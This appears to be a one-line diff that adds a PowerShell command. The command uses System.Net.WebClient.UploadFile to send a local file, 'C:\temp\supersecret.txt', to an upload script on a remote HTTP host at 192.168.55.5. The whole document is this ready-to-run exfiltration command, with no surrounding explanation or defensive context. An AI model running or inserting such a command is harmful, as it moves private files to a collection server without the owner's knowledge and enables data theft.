@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).UploadFile('http://192.168.55.5/upload.php', 'C:\temp\supersecret.txt')
